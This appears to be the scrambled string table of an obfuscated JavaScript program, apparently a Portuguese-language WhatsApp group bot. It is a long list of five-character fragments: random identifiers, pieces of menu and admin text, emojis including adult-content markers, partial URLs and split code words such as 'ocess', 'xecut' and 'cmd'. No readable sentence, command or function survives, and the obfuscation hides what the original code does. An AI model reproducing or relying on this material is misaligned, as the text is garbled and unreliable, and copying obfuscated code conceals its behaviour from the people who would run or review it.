"es da", 'load', " ☹️/wh", 'JMdOP', 'yUBcd', 'icado', 'MKuIm', 'ossos', "m pou", 'Gif🔥', 'Rolet', "35. ❄️", 'tes', 'ryrhK', '0|2|6', 'vQYbW', "o @?", "\n\n■■■", 'IvuVh', '://ra', 'MmuVZ', "ou fa", 'rzpqC', 'BfUUt', 'ktalG', 'mEfFd', "os, d", "ido i", "ls 🔞\n", 'iares', 'ERTXa', '𝐓𝐄𝐑𝐂̧𝐎', 'gemin', 'xrobo', 'OQkAa', "eja r", 'old', 'tqBPj', 'rruma', 'hidet', '𝐀𝐓𝐎𝐑𝐎', " \n   ", 'Sonho', 'ogos:', "\n\n🗑️\n❲", 'rsxGY', 'FPOXu', 'cXfUR', 'VLIfP', 'kxaJM', 'uPpQj', "stou ", 'JqrfY', 'zir', "S X 1", "a nin", 'PCISk', "12. 🔞", "udem ", "onar ", "rl: *", "27. 🔞", 'RyOzP', 'HyqLs', "um ba", 'nisso', '18851', 'liMjw', "ada m", 'PojBl', 'JsOBW', 'creve', "🇯🇵 𝐋𝐈𝐒", 'NGcMK', " Algo", "te ao", 'nbAlW', 'rMiAt', 'eon', 'imyxs', 'ZvJyd', "𝑶 2 📁", '𝐚𝐫/𝐝𝐞', 'NGpIy', 'ujlzQ', 'PrtiH', 'weGIU', "𝐕𝐀𝐑 𝐋", 'fQJOO', 'IzyrC', 'sador', 'ymGNj', 'dbYES', "O SAI", 'tação', 'ewTKQ', 'UnAYk', 'vXkUy', "\nRua:", 'JJriv', "Ta qu", 'lcdeD', 'RalVv', 'BWAQR', 'aqQRh', 'UTAHJ', 'SpwcM', 'togif', 'hxAwJ', "o apo", '.styl', 'EFsLh', "hine ", "24. ❄️", 'LieRv', "X9 De", 'acAgE', 'leta.', '6|3', 'm,meu', 'LplNA', 'vLbQn', 'getDa', 'cao', ':5051', 'EpjAW', "com a", 'nGkpj', 'DlKCx', 'UzuKw', "ueça ", "66. ❄️", 'DNXhp', "guês ", 'ǫᴜɪsᴇ', 'mUaLZ', 'HZVnd', 's/mai', 'ry/ga', 'PkKny', '5572/', " AQUI", ':00', 'ygqQy', 't.1.s', 'AdduK', "𝐈 𝐅𝐀𝐊", 'qWThK', 'gue', 'xHYxd', 'dabv2', 'DcFQe', 'infog', "𝐃 ❄️", " bota", 'MmEDY', "2 con", 'bQZVT', 'qzDSQ', 'gens', 'FxOXn', 'JuPZZ', " 31 d", 'iva', 'ua!', 'scwbo', 'spOxL', 'hoje,', 'qQbGa', "e *Co", 'drive', 'slow', 'DzQiu', '0|Boa', 'bICmd', 'nd.op', 'hYPiK', 'gQKym', "\nIbge", 'tOHYW', 'cBQQR', 'MIUZx', "... 😏", 'de...', "   🔥𝐓", "te V", 'LZkBO', 'vzKDQ', 'uter', 'eator', "o\n\n", 'QFfim', 'icias', 'YZMaL', 'SFHGG', 'eros', "R👑* 」", "A* Ou", 'eira.', 'JYBEL', 'PngFN', 'SGkBK', 'com.m', '𝐉𝐎𝐆𝐎𝐒', 'kmWVn', 'nt.we', 'LVTNr', 'xos', 'MzBDt', 'NYyFh', 'fFsvn', " 🚫", 'Ropok', 'ZxAtM', 'ify.c', 'uJiyi', "var -", 'THAI', 'DiaYj', "s ant", "app f", 'stdTT', 'Hrbvs', 'dkBzZ', 'VOyRM', "NK CE", "ma da", 'gura', 'YWabk', 'h?que', 'VEIpP', " ae 😶", 'jkzje', "𝐈𝐒𝐔 𝐔́", 'EizWk', 'VoLMd', "u rob", 'PRtpX', 'onfor', 'Liqhb', 'vitar', 'emium', 'WoDPS', 'rsuDb', 'terad', "e Elo", " TRAV", 'QoplO', 'Jijjb', 'jymRs', 'erros', " 3x, ", "*㊙ RA", 'pdjZQ', 'KwuMJ', 'gkgxm', "ste l", 'rmnot', 'oite', "🇯🇵 𝗬𝗨𝗠", 'jaeYG', " meni", 'xNjSz', 'omand', 'ovfMd', 'LcOEo', 'nCxTz', ", Ire", " Usad", "a um ", 'xTDcN', 'uwBqv', " 🐃", "vel: ", 'ica.', 'boaRE', 'LII', 'axYoj', 'KUxgq', "ra em", 'BvasE', '+4.15', 'da..', " hh:m", 'SSERq', 'YMQAD', 'lejfX', 'ADgdq', 'fJAeo', 'url=h', 'DLwiw', " prob", "sta n", "s(0) ", "A api", "1: ", "ta\nEx", "tá De", 'SUPER', 'vo_li', "ETH2 ", 'uLIGe', 'o📝', "   \nJ", "ntos ", 'FGAtI', 'CuteT', " ou f", 'VDKtx', 'ygQNK', 'aKzep', "rá po", 'xWFTx', "r apo", 'dindo', 'i.bro', 'lado.', 'gEBrt', 'Nesse', 'DotPd', 'ifu2', 'LJDuc', 'zxiup', 'KEQEl', 'idore', 'vVQfB', "NDS M", 'ixo', "ig gw", 'bpEcM', 'LWeik', 'lAxSb', " 2+2\n", 'uTOvi', 'z/Lin', 'orros', "s voc", 'nse', 'osjog', 'PSEZE', "gado ", " *2MB", "Sem G", " mim,", " joga", 'vRIZm', 'ylrVo', "o úte", 'Ompdl', ". A c", 'PGxBF', 'xFEbL', 'turn', 'DVybm', 'resol', 'HQleX', 'zGwEE', "Deu R", "iar s", " Loca", "83. ❄️", "r... ", 'mprés', "│+ To", "n nes", '71f', 'Tesou', '𝐌𝐀𝐆𝐄𝐌', 'r+Bow', 'qWBuG', 'YXoIS', 'aviso', 'ht.te', "│\n│~⪧", 'PbKnx', 'adsNW', 'cture', 'cWiqe', 'POvck', 'Ffgdk', 'MCnES', "Da pr", 'VcRGH', "OR* ", 'dente', 'BuEEr', 'mHVB', "uem e", 'jPqGa', 'ixar.', "o env", 'lsFck', 'DQJnD', '───TE', 'ybYcz', 'zRVLV', 'dDVfS', 'Fetch', '3053', 'ustra', "ue aj", 'dugaL', '5b141', "❄️ 𝐆𝐖𝐄", 'SsToJ', 'tlHBZ', 'KIGcn', '%20Pr', 'JEDEC', 'UEIRA', 'OjGrF', 'ace:2', " opçõ", " Emoj", 'UTjZz', 'BzEPu', "%\n▢ *", "💋\n*NÃ", " 🕹️", 'nayHj', 'dHfzE', 'ZiWwZ', 'in/an', 'emp_G', 'ZZELa', 'AABKU', 'XyCYh', 'rddgF', 'vzplW', 'jojMF', 'fkLpS', " Figu", 'tos-c', 'qSZkF', 'EdpIJ', 'FnyYE', 'misso', 'UsUMo', "ez el", 'JjRhF', 'aocuV', 'aVuBU', 'ibge', 'QcNxh', 'P.zip', 'fydl', 'ringt', 'c3097', 'nnage', ":_*\n*", 'ile/2', "* 」*─", 'hMkFO', "ANYA ", "o tod", 'LtveK', 'gHAIE', "ubo o", 'sione', 'MkENB', 'LMJzh', 'ure-3', 'mgCKm', "al e ", 'CLOjx', 'words', 'hMDtY', 's/Ani', "55 99", 'moria', 'kyVFK', "📍 TXT", 'ZZsOw', 'FmAHA', "GO IN", 'VBsFw', "te: ", "nto a", 'ygIuB', 'DDEOA', 'lTmaK', " UM U", 'kEbop', 'DixTX', 'tore/', 'ImXss', 'GQbyw', 'remia', " 🍷", 'cQMPJ', 'cara', "o esp", "🇯🇵 𝗔𝗞𝗜", 'Gvjbs', '*Valo', 'YAprc', '𝐈𝐍𝐇𝐀𝟑', 'NWtzB', 'pink', 'GpPkY', 'VOPcV', 'ipv.', " a no", 'cEoRs', 'fysea', 'tmjEz', 'WXcSS', 'KmeFH', 'ret', 'oJoeu', "sse u", "m o m", 'amvGl', "🤖 *", 'ine.b', 'eDhec', " de h", 'tesco', '𝐊𝐀𝐈𝐒𝐄', 'ZiOOK', '|3|2', 'YoXoE', 'soOyU', "EZES ", 'qkEFa', 'Zombi', 'hã.', 'GgkMk', 'uERHc', 'getin', 'ntamo', " Sábi", "eu pr", 'BThOQ', "n, ma", 'libop', '6awvr', 'UgHJM', 'Bombe', 'pzfIm', 'OSTkd', 'DbRzT', 'bnail', 'Bqfjd', 'CYMlU', 'erani', 'WcEKo', "Err: ", 'humid', "o a m", 'AonUU', "ca, a", 'zxXyW', 'cOjdq', ":*\n\n", 'textI', 'ZtakW', " 𝐑𝐎𝐂𝐇", "não r", '.ogg', 'HXwNK', 'hnnJz', "Mini ", 'ddd', 'uFESV', 'sqrt', "da at", 'MwaCK', 'al.', 'ObtUj', 'abrir', "e max", 'adas:', 'ense+', 'TXKPY', 'iLdDA', " A Es", 'iufSJ', 'DAbWo', 'fVTvL', "ro da", 'RZNyD', 'twEOJ', 'cb23e', 'ostra', '*expo', 'nWqzO', 'JLqMI', 'ientí', 'LhMKK', 'rd2', "ROS P", 'KzVUQ', 'xHWqx', 'entWi', 'mLUqp', 'aFxbb', 'tenot', 'hOAJC', 'lEAwD', "visu ", 'kyGHa', 'BvtkT', 'SoThw', '2mEXE', 'opena', ". 🥵", "s adm", 'uKKgl', 'otáve', " open", "po ✔️", 'WCSTl', "u /30", 'ilham', "DE AT", "tmo n", 'aPsGO', 'EZPpa', '/Usuá', 'NeqoX', "pra o", 'ahvqa', 'GLDFg', 'uEvSP', "┉╝\n  ", 'eODKp', 'BZwvx', 'ssoa', "ra me", 'ySWtn', 'uwqJH', "/ a *", 'dYwaf', 'eum', 'WVDhi', "33. ❄️", " Time", 'RFBtz', 'mezWo', "uém p", 'YOiCC', "em mi", 'tVwjl', 'ayhzh', 'xDzVA', "DMs: ", 'xBdJf', 'mGUIF', "tá na", 'GwZLJ', 'libwe', "s reg", 'o_Da_', 'HnYpg', 'vfnRq', 'EATH', 'VAiiO', 'uYYmm', 'yLdgn', " no g", 'HFYYI', "pra s", 'SySCD', '/api-', "údo g", 'reter', "tão a", 'CrHSA', 'DBFuS', 'jvZnz', 'escol', "🅾🆂 🅳🅰", 'dific', "RA ❄️\n", 'ebQog', 'saOwj', 'orgol', "o mai", 'AUTil', "MA: ", 'aPmRT', "sar o", "ar: ", 'jWoLR', 'rOcqa', "O PRE", " 120\n", '5|0|3', "bo, a", "• *Tr", 'qYXhD', '://te', 'BBIT', 'NTATO', 'ChGff', "no mí", 'raria', 'jJYTr', 'jdjuz', "ica n", 'eIuUZ', "𝟐 ❄️", 'Flltp', 'YqFJD', "o pro", ")\n└──", 'JJaFB', 'cnjyh', 'iWJpt', "e ten", 'wAvVO', "43. ❄️", 'ODqmw', "e um ", 'so_ad', 'bCSLR', '═┉✼┉╝', 'Compe', "te us", '🛠️', "te al", 'QdvjF', 'djMqx', '0MB', 'IKVyr', 'UuLcq', "nhe o", "ogo t", ", ~@", "á dad", 'BHKIM', "[v]\" ", 'd_Cle', 'LiiSn', 'kNwyk', 'lbTyI', " 100 ", "e Ant", 'nWuzh', "dos, ", 'node', 'xafpr', "\nddd:", '.0.ou', "ao fa", 'dHBnH', 'ishpW', 'TJMGN', 'Wopgg', 'ownlo', 'SzdXs', 'PTrPw', "NE RA", 'io/mi', 'desan', "u man", 'g.a00', 'rOLIY', " GYOM", 'EmjsZ', 'pjhWW', "a o h", " ] \n\n", 'separ', 'ILltT', 'JGTuo', "ue 5.", 'lCDFw', "á no ", 'wpCTM', 'Yjquj', 'mCHAc', 'm..*', "rão r", '*Níve', 'batJo', 'sapp.', 'jeXaR', 'ndrea', 'DVkiY', 'tJbAK', 'xaRBn', 'ram!!', " no t", '4E2dk', 'njiro', 'JfFiE', 'io2', 'style', 'PIldl', 'Alugu', 'sion*', 'PjBJD', "ece q", "SSO -", 'XoOeC', "u foi", 'KtKzt', 'istag', 'lgPEw', "\n  ╚┉", 'qQfYL', 'lIbKQ', 'ASQHI', 'JhNFr', 'fAXdg', 'langu', 'post', 'eZuoM', 'wKqAa', 'XaWFo', 'RVkNQ', 'TMUXB', '..._', " um e", '-QWr0', 'fKrdZ', "⭔ Tít", 'rJWeJ', 'CgndF', 'vKATC', 'SmWCt', 'enta,', 'BnFJY', 'LXOQy', 'Widce', "cure ", 'SNdnu', 'sWQcU', 'Jkkdx', 'WrCby', 'BIMpE', 'fhuCX', "so ne", "52. ❄️", 'SRqdt', 'oZRAf', 'fTefL', " \n╏❆ ", "e# Be", "e nes", 'FxvBO', 'ribBe', 'VoVPN', '[v];[', 'QZAue', " 🎥", "Topa ", "o* 🌹\n", 'FTalh', "hum s", 'mbLHT', 'vaEwl', "Só is", 'edora', "Lite ", 'yPehL', " sabe", 'n:htt', 'yPMyK', 'sessã', 'ReBeB', 'hDiqz', 'dKKxl', 'hqBUB', 'Niffl', 'Resul', "já us", 'DO*', "igu 1", 'lEiSS', "ó pra", " , so", " cate", "nti m", 'VhOuF', "do nã", 'mGkpS', 'QMiyc', "ra*\n\n", 'KcDtx', 'jMqLH', "uir ", "ivem ", '.1.39', 'react', "ado _", 'QYkiG', "  RAN", "ma qu", "dos n", "a log", 'zyIkN', 'wUjYT', 'rxzhq', 'sqrt(', "to: ", 'velme', "𝗨𝗠𝗜 🇯🇵", 'oslin', 'xrTIq', "a per", 'AuViX', 'vEqoK', 'olpe', 'gROkV', "_-\n\n", 'lHgwD', "---💥 ", 'e-now', 'Lxffe', 'xwWGn', 'HeyuL', 'fdb2f', 'ALqEF', 'pWKFt', 'pUAiO', '𝐢𝐥𝐚𝐫𝐢', ", Na ", 'DUyLr', 'PECÍF', ", do ", 'QTAPs', "s. Qu", 'fCThM', '05:00', "ha co", " 100", 'OVlQH', 'XyfZw', 'EjuNT', 'CbFMs', "O - _", 'wLWjr', "\n║ QU", 'ay.go', "adm, ", 'ue!', " •.\n【", 'Rosgt', 'VEnoG', 'IqkQR', 'jtKCp', 'aQgBc', ", tem", 'ADEfo', 'Ehraa', 'MEUgr', 'dUJAV', "eu Um", 'VVLHY', 'uivo.', 'dperf', "e vai", "Caso ", "xos\n\n", 'MdpJd', 'la/5.', '/peit', "\n\nUsu", 'bb635', 'SWJRc', "após ", 'tRed', "e jun", '5|2|3', 'HEtZQ', 'dEzJS', "*\n*Ho", 'uRGNO', 'DSwcz', 'onenc', 'wmIwc', "ue vo", 'QVVyJ', 'uliOM', 'nvRnF', 'XBhAQ', 'YJpZS', 'PiFho', 'pyiJm', 'setDa', "   *", 'gifPl', "em. T", 'thub.', 'PexQI', 'YmWts', 'BtBqN', 'pLWgC', 'JGvqX', 'WxviU', "já ag", 'fKrLz', 'JRldH', 'JutsF', 'oTxyq', "rfil ", "a ter", "RIO D", 'kIsgR', 'OsvqV', 'cipar', 'KPKTY', "ê é: ", '64%25', 'dcore', 'rar', 'gia', 'orld+', 'RpcPS', 'aYuyB', 'pFVTZ', 'mIdML', 'adas,', "☟︎︎︎☟︎︎︎\n", 'hEITG', 'zqpFO', 'IqVmT', 'Strin', '❳╼━╼━', 'UxiIJ', 'WPMqe', "tou o", 'gXVol', " site", "69. ❄️", "data ", "em gi", 'hEDLq', 'aJiqp', "mio c", "OCÊ Q", 'tilin', '_temp', 'PZmsH', 'ehIMj', "ivo n", "𝐎: ht", 'KtxNW', 'ScCqQ', 'Selec', 'rayMe', " 𝐃𝐈𝐕𝐄", 'lur=1', 'enque', 'NoDqO', 'd_neg', "le ap", "AGEM ", 'eyLRm', "Que t", 'tshxF', ". ❱", 'TZYEQ', 'coroa', 'ponda', "tos\nB", 'HhsjN', " ]\n*D", 'Class', 'gkYDx', 'PDBDK', 'csDHu', 'eNNwE', 'kmMvl', 'syste', "le us", 'BxhMs', 'PEtnK', 'imest', 'detai', 'UcyNu', 'gJnLY', "╌┈─\n❌", 'lXNgR', "das p", "as 5 ", '9.jpg', 'DSvAs', 'gMMyW', 'LTrRO', "*\n*HO", 'KQsnP', 'vQzKD', "e , d", 'jAnXw', '/YYYY', 'wZOGn', 'estar', 'ILSXl', "ti Li", 'wWAqL', 'NxdKS', "ta so", 'NAGRA', 'kufso', "a mó ", 'HKxsM', 'ZqnfK', 'gRXPt', 'ERRO', 'a%203', 'PDzOh', "se De", " e ta", " So A", 'iIlbG', 'subti', "_ com", "ᴘᴇᴢᴀ ", 'aJtpV', "e a m", 'kAABF', "ª | 🛡️", 'qmTrw', 'LKrSq', 'IDthM', "(10) ", 'FbpEc', 'ba9a5', 'aHgOy', 'VtihV', "\nSiaf", 'tion', 'dsJqW', 'KwfgF', 'uFiZC', 'mLpJk', "mor, ", 'tPFIk', "e viu", "𝐒 ✅", "𝐆𝐄𝐌 ❌", 'LBaZo', 'tzWCQ', 'qkpnP', 'dnka/', "O5qe\n", "s dia", "m pun", '00776', "que v", 'PSIDT', 'MXaGY', 'yUzWg', 'vEHUS', 'BdqqK', 'CeHMy', 'Vlbrj', 'lyxxL', "   \n❌", "nto V", 'gMBNG', " de e", 'JxRXO', 'JhRTw', 'Thyxz', "🖥\n4 -", " bloq", 'garam', 'vjICI', 'dando', 'HUlmC', "ts sa", "D𝜣 GR", 'dslio', 'gkHyU', 'nmUCh', 'ínimo', 'ndaTr', "ig an", 'nMEuW', "\n*Seg", 'UKzqi', "é pra", 'cmd', "!!*\n*", 'lyric', 'alic&', 'ios.', 'stabr', "  【✔】", 'JHvmu', "em a ", 'revie', 'TxQaz', 'menu2', 'd93f3', 'encam', 'xecut', "u de ", 'vo_ty', 'MxhpS', 'aleDa', 'FphDb', 'emp', 'm/k05', 'R/AjQ', 'anota', 'vXLrh', 'chat.', 'ncime', "o gp*", 'sXVKM', "o, bo", 'lFDkj', ", com", 'DLLCK', 'nPCOE', "U ❄️\n", 'RbEUk', '272a2', 'Ranki', "e rev", " Esto", " Util", 'gCzJo', 'pMJEk', 'cyusn', " Melh", 'e...', " spam", " stic", "rá 15", "\n▢ *N", 'TRADO', 'QXETr', 'wMWGb', 'evel', 'KbNkX', 'GEFeo', "MA PO", 'istão', 'ator.', 'GTnYG', 'fYDJW', 'Somen', "ão po", 'IJNUg', 'KQhiB', 'ecemo', 'kfJbE', 'utf-8', 'uwMAg', '|2|1', 'xzTNx', "0\n\nAn", "ra in", 'nar_v', 'pEaLH', '2|4|5', " Prov", 'xwstA', "ltar ", 'tips_', " entã", 'Hello', '╭╼━╼━', 'GZGmJ', 'mrjkm', 'prova', " devi", "á vaz", 'ANVLf', 'sZLHc', 'wLFEr', 'lLrOJ', 'Erro.', 'ApqsD', 'glass', "WILD ", 'PDdtj', 'zQYTp', 'dgfsX', 'egram', 'IxCtY', '15255', 'Bucet', "der a", 'beRdP', 'oxDbE', 'NNDev', '2ff&t', 'fDkuX', 'eeyqU', 'psFNf', 'JwzCs', "ja O ", 'QWrnE', 'vtpIX', 'jSyNH', '/api/', "NPJ: ", 'UONIK', 'bile+', 'etteg', 'rMHcR', 'IJLlB', 'Ainda', 'tting', 'GMLtb', "as te", 'ch__l', 'biuBd', 'qaRzm', "ca/5\n", 'diafi', 'aruk', 'urYmu', 'in/js', 'zuWtE', "apel ", "  O q", 'YsTAs', 'zCxrg', 'FgcOH', "𝐃𝐎𝐑𝐀 ", "vai v", 'FYcVV', 'child', 'TQYNv', 'lYLxf', 'op13a', 'ocess', 'desc', "m leg", 'yuv42', "ndo p", 'bzUBX', 's_alu', 'HUxuo', "dia. ", 'anga,', 'nemi', 'HMpyQ', 'wing', "*\n• U", 'tório', '._*', 'jsFcD', 'nJdSg', "ta 1", 'b6dab', "ㅤ  ◍۫", "á ati", 'vJgsH', 'pbuvI', 'XRyRy', "el at", 'ceboo', "upo a", 'Hszsv', 'gYeqj', 'yDRXy', 'kitHp', 'EBvSW', 'xhwNE', 'f5cq9', "𝐍𝐓𝐈 𝐃", 'YBCVn', " 𝐌𝐄1𝐀", 'UaNdr', "lo 1:", "ele u", 'KjtFv', 'AXgzE', 'SXZga', 'ySzxZ', 'qWMrl', 'hGKZD', "rota ", 'XMadH', "Song ", 'tzNsm', 'uKzaZ', "O TOD", 'xtBiB', 'JUqNA', "dos.\n", 'bTOnT', " da m", 'ufbRh', " ause", 'AOHcx', 'yXSUJ', 'xImjW', 'vhVCP', "ias: ", "%*\n\n", 'ficac', 'IscVO', 'POrFE', 'tral', 'CAIJQ', "ira c", 'uFKIj', 'entri', 'ujUQd', "l: ", 'UYQzU', 'num_i', 'ENÇÃO', "eme g", 'NSkBp', 'IpWNh', 'ontin', " Dark", 'aSchw', 'VjoFw', 'uaqvX', 'yTqQd', 'IZhPa', 'ument', 'zYHmw', 'XAEYK', "s, pa", 'OADgb', 'mprou', 'looda', 'wlrog', '3_pol', 'noPsg', "AMA: ", "m, qu", 'xIoOX', '@marc', '=com.', 'ZAzBH', 'TTltc', " do u", 'xNmlt', 'ySgmU', 'izar', 'dXymn', 'VFvhc', '𝐎𝐑𝐈𝐘𝐀', 'eENii', 'QcUhG', 'kLdYt', "\n1: ", 'akina', 'RsiMA', "use 1", "ppt t", 'SrFGZ', 'UpaZj', 'OCORR', '.jpeg', "ng 🕹️\n", 'bCQOE', 'pagam', 'ebCor', 'ídeos', 'nWjIs', 'pFLWp', 'Zruyy', 'oneon', 'tHtcL', 'uote/', 'xUDmF', 'KMtuX', 'GcfmM', 'Maahs', 'BIXiA', '59127', 'a9026', 'bangh', "*🔞 𝐏𝐄", 'VvQJU', 'cjZma', 'zSWVs', 'OSLXH', 'JPEgt', 'moeda', "\nA ", "ra qu", " _- ", 'LfqXG', './DAD', 'lFnqa', 'DesKt', 'Subje', 'PGBkG', 'licat', 'IPExg', 'dMwQS', 'fGZKB', 'PINcF', 'eTdLC', "VIN ❄️", 'ZNJbX', "👉🏻*\n\n*", 'aNiTI', "ale c", 'ackgr', 'mPnUo', 'sTWaW', 'eYSeH', 'URmju', "o Res", "🇯🇵 𝗟𝗢𝗟", " na(o", 'WrxrJ', "Não e", 'oUPOw', 'egal,', 'packe', 'provo', 'ários', 'eJvUy', ".\n\n_3", 'Erpki', '𝑶𝑪𝑼𝑴𝑬', 'dOnly', 'mZCjx', 'JxFJf', 'eHbBj', " seus", 'mkinr', 'ubara', '▄▄▄▄▄', "oku, ", 'DINPN', 'MevkU', "tear ", "ou, t", "o 😖", 'rdjFp', "ez ne", 'oot', 'GaEKg', 'ezyzn', "e bus", 'FGbFV', 't.0.f', 'tKJCP', "s, e ", 'hqQiG', 'MTdeg', 'quivo', 'sDKDb', 'aaqWd', "a vel", "arc 1", 'wabrH', "esse ", "são. ", "te o ", 'engan', 'WEYnB', 'ile/5', 'mium,', 'ome/8', 'PrGDS', 'Hvthe', "i adi", 'ANXXn', "/3 *E", "do gp", 'nTEfu', 'pLzGB', "Peso ", 'VoBwX', "❎ Err", "ão De", 'WoxuZ', 'exZpp', "to SA", " é fe", 'contr', " esto", 'bnSuW', '𝐂𝐓𝐄𝐑𝐄', 'SUCES', "\n*2 -", 'hNndX', "r 2 p", 'aft_1', 'LzusA', 'jRCrT', 'CvQEg', 'jKxoA', 'RgWiD', 'IHCKF', '//wa.', "teja ", 'JRSGB', '3|1|4', 'dARTu', 'figau', 'uista', "os:\n\n", "ocê g", 'fast', " 🌹 PR", 'zVhSF', "imo. ", 'r=000', 'NAAQD', "OL SI", "tml\n\n", 'EPVlk', 'hoyVR', 'RLlCU', "u úni", 'cohzl', 'iar_v', 'Feebx', " 1 di", 'EADOS', 'lorfu', ';base', "Opa, ", 'YlAEx', 'duelo', 'aixad', 'reFxR', '֟፝🎡⃞꛰𝐋', 'aTdGi', 'ldfNM', 'mItfm', 'iSMqv', 'erty', "ao ba", 'EPrtt', 'isFor', 'eOcsg', "er es", 'BziAO', "bot, ", 'EfpOA', 'GzPeE', "r-f l", '21629', 'luso,', 'dTkYe', 'yIOAj', 'acaba', 'HqTLR', 'ahIUz', 'wbNlJ', 'WCmyO', 'imal|', 'ethro', "REAS ", 'kmmpn', 'nKbjo', 'uTWdB', 'dgkGC', "xo us", "sa Sh", "r o m", 'JsAOx', 'gifQp', "ro pr", 'MPyMV', " para", 'VXkTg', 'VjihA', "\nwa.m", 'url=', 'JdErb', 'ThBpK', 'usus', 'veCLa', 'rCElU', 'ciar.', " 🕹️\n", 'prQsi', 'JyewZ', 'iDyrA', 'Badmi', "as nú", 'bKit/', " corn", 'FwKKn', 'TgLwY', "de do", 'taram', 'qRLRK', "mn -_", 'kszEt', 'ortan', 'THIvw', 'ChvjX', 'fEMLs', 'qVhnw', 'CnJPK', "so é ", 'CqRvO', "umo d", 'SEQEL', 'eURBN', 'cadei', "hou (", "is co", 'LHrzt', 'ribtm', 'CZtSi', 'hVrsr', 'mbnai', 'SIDgM', 'hOXCR', 'helps', " nos ", 'pts', "el:* ", 'aCexA', "nk\n\n", 'xxwbH', 'LYLHR', 'ays', "ual c", 'dilIi', 'MTwJX', 'D8kOk', 'CqfAJ', 'ufLGo', 'shUfi', 'vfcgC', 'VEvcF', 'IKYqR', 'gUSGA', "o don", 'kekQM', "❄️ 𝐑𝐄𝐈", 'TttPK', 'HRGZc', 'lLOYe', 'v9Vpe', 'iaJEa', 'jtJqc', 'so👑', 'eSPRB', 'Ubgvw', 'DTEJc', 'YqMlY', "elho ", 'CCpsj', 'vhzkk', "\nInfo", " incl", 'IBCag', '02f33', 'cFtqn', '𝐋𝐓𝐀𝐃𝐎', 'WaFLE', 'sBeVH', 'qQNfA', "ig sp", "ulo d", "ts as", 'szklm', 'GNikq', 'vhXmd', '4|3|1', 'DfyaQ', 'ssGnX', "TUS L", 'rankl', " TANJ", 'TsPoX', 'tefux', 'DLcBg', 'StyPG', 'Data.', 'tipo', 'QfiqS', 'vEAZM', "guir ", " EART", 'rutfL', 'TbZtx', 'fil..', "olão ", 'Reque', 'hePmZ', "PAM n", 'amydS', "o na(", "l atu", "É nec", 'zboBF', 'qlitJ', 'BJbzk', 'GcTdg', 'dJIfL', 'Kuaqc', 'cts', 'AME:🚸⃪', 'adogp', 'vCNoP', 'ubmKU', 'agar,', 'on/co', "\nOlá ", 'TEMPO', 'ce%3D', ": \n\n-", 'cBbqH', "ém ti", '&appi', 'kbyFn', "ou sa", "ts eb", 'euEKh', "De Ad", "S4 ❄️\n", 'OqSxi', 'emoqI', "SSÃO ", 'YPqEG', " o jo", "11. 🕹️", "ica s", 'HQtvk', "ig me", " tags", " volt", 'cuEZe', "% ❱ g", 'EKrTb', 'urado', 'HwmKV', "nte q", " Cata", 'me2', 'jkAOO', 'oRqnZ', " 1, v", 'wcWgo', 'dRK2I', 'xzqve', 'clGXh', 'OnKCj', 'CVzHM', 'knCeI', 'Whzad', 'datab', "ceu o", 'eLylo', " - ", 'yAkoY', 'eii', 'le/vu', 'one', 'cff72', 'gif/y', 'Deus', 'QOPYI', 'IqFEa', 'INADO', 'Jbmdm', 'QLgXc', 'RvPAu', " abai", 'jcCcG', "ue um", 'de..', "lhor ", 'occer', 'GijjK', " clon", 'TIcCl', 'TPtqo', 'WmchX', 'APLIC', 'ZvkIL', 'spira', " acho", "tá pe", 'oqyTQ', "ot, e", 'olor=', " _est", 'vGbSs', 'sbloq', 'nadas', 'bLZLB', 'riorm', "em Gr", 'qtXHK', "vado ", 'spoti', '/blow', 'KspSZ', 'yKZnu', "el De", 'yeYpa', 'FnaOG', 'yFyau', "po 🪀", 'NqosQ', "E DEL", 'mos..', "Man 🕹️", 'AOFLB', '71cb9', 'po..', '6|4|0', "\n\n☈ 💑", 'eo2', 'copia', " têm ", "[ REM", '5c9a2', 'gcydN', 'RpdcK', " \n\n> ", 'LsqoT', "mas f", "rado ", 'Hlmjd', " No j", 'ee28c', "O ADM", " REMO", 'gurad', 'fQdWA', 'bGqxr', 'SABIA', 'zJSTW', 'FEIsf', 'bJsjp', 'cAqYb', 'PkucA', 'vQJbN', 'xLVyS', " de ", 'zuLFt', 'XAYYP', 'rio..', 'kpngv', "nter ", 'ihZKw', "be. E", 'DyFmb', " da M", 'ignor', 'yTxRB', 'takus', 'MPtNs', "𝐍𝐀 ❄️", 'wnzVs', 'ezIXr', "❌* \n\n", 'ERRO!', 'YDsBi', "a cha", "s dos", "m rem", "54. ❄️", 'kvMFV', 'custo', 'khkHj', 'zkpZd', 'api/m', "ANK D", "ve ta", "❄️ 𝐆𝐀𝐌", "𝐑𝐎𝐗𝐎 ", "4. ❄️ ", "𝐄𝐑𝐒𝐆 ", '6242+', 'bUBry', 'YXXJO', 'cbiGV', "l con", " \nCom", "𝐈𝐓𝐒𝐔 ", 'JDrAB', 'RDvOb', 'btMAp', 'EPdee', 'WgkqH', 'klReq', 'Uryyu', "ero:\n", 'rdena', 'recom', "sou p", 'IUODD', ", fei", 'VefXz', 'ty=71', 'qEkHf', "\n\n[ C", 'IzooS', " ESTA", " agua", 'end', 'vftPG', 'wqEQZ', 'YcPYz', 'userY', " de b", 'cuida', 'CjhQw', 'agold', "fixo ", 'rQvjy', 'IQAxd', "or De", 'soCIR', 'ticos', 'ento', 'gFPsF', 'FDjZU', '4LhGGnh', '895aa', "o  _-", 'LKthp', 'figra', "Ꭼ̸ Ꭰ̸Ꭺ̸ ", 'rFHuM', 'osts', 'sg2', 'OzquK', 'BQqik', 'iscad', 'GcBsm', 'bnWdn', "\n┞┧Ms", 'NcSch', "so fo", " 𝟐", 'vYBZi', '𝑼𝑴𝑬𝑵𝑻', 'adm', 'm0zwq', "║✼ ", 'QAKjc', "nte c", 'oGuEl', 'pULYl', '5bc4c', 'CUvnN', 'gyoaG', 'flGeU', " núme", 'dVXzJ', 'hmiTS', 'koVPX', '72cf8', "\n║ 𝐰𝐚", 'zUsPd', 'VuOcC', " apag", 'izFNi', 'pFqnn', "nao r", '#temp', 'UmNAd', '/noti', 'msUXw', 'qpNYO', 'TIMrD', 'RZXxj', "mido ", "io fo", 'oYnkn', 'sfund', " /100", 'aTsLr', 'wAVHS', "rar p", ". Lei", 'BzAku', 'tZGcS', " venc", 'FECHA', "OR- A", 'dRIhi', 'qwesf', 'KjvzU', 'zjUrR', 'HofvG', 'BIRDS', "em su", 'gVeHz', 'WuoRP', 'bDOeA', 'nABSp', 'eACiR', 'link', " 𝐅𝐄𝐇 ", '/7yqm', "io: @", '𝐖𝐀𝐋𝐋𝐏', 'arCrA', 'WYudG', "erá r", "o Ini", 'ição:', '/YY', 'CpvRo', 'ibgTQ', "o tev", 